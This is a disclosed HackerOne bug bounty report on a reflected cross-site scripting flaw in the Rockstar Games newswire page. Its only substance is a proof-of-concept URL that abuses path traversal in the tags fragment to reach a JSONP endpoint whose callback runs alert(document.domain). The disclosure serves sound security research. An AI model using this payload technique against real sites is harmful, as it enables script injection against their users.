# Reflected XSS via #tags= while using a callback in newswire  http://www.rockstargames.com/newswire

## Report Details
- **Report ID**: 153618
- **URL**: https://hackerone.com/reports/153618
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-07-25T06:15:57.105Z
- **Disclosed**: 2017-03-16T22:23:53.287Z

## Reporter
- **Username**: nahamsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rockstargames

## Vulnerability Information
Hello,

Here's the link:

http://www.rockstargames.com/newswire/tags#/?tags=../../comments_dal/users/getGlobalLoginSettings.json?callback=alert%28document.domain%29//

Thanks,
Ben

## Attachments
No attachments
